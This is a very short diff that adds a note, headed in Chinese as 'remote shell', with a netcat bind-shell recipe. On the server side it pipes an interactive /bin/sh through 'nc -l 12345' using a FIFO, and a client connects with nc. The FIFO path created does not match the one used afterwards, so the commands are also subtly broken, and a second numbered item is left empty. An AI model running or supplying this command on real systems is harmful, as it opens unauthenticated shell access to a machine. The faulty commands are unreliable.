@@ -1,0 +1,8 @@
+1.远程shell
+Server:
+	mkfifo /tmp_fifo
+	cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 12345 >/tmp/tmp_fifo 
+Client:
+	nc localhost 12345
+
+2. 
